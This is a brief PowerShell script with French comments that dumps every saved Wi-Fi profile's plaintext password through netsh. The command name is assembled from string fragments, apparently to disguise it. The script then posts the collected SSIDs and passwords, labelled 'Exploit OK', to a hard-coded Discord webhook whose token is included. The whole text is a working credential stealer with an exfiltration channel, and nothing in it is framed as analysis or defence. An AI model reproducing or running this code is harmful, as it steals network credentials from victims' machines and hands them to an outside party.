# --- CONFIGURATION ---
$hook = "https://discord.com/api/webhooks/1484236898066104430/Xj7jxYakm87P19-WQVb8yi6tcNfpFrwPscNE8dIlVw_TsYv4IkQh9gku_p_Giizyo3Ro"

#----Récupération----
$n="ne"+"tsh"; $w="wl"+"an"; $p="pro"+"file"; $k="cle"+"ar"
$res = (& $n $w show $p) | Select-String "\:(.+)$" | %{
    $name = $_.Matches.Groups[1].Value.Trim()
    
    # On récupère tout le profil
    $details = & $n $w show $p name="$name" key=$k
    
    # On cherche la ligne qui contient "Contenu" (FR) ou "Key" (EN)
    # On utilise une regex qui capture tout après les derniers ":"
    $passLine = $details | Select-String "(Contenu|Key).*\:\s*(.+)$"
    
    if ($passLine) {
        $pass = $passLine.Matches.Groups[0].Value.Split(":")[-1].Trim()
    } else {
        $pass = "[Vide/Open]"
    }
    "SSID: $name | Pass: $pass"
}

# --- ENVOI DISCORD (Syntaxe simplifiée sans accents graves) ---
$flatList = $res -join "\n"
$payload = @{ content = "Exploit OK\n$flatList" }
Invoke-RestMethod -Uri $hook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
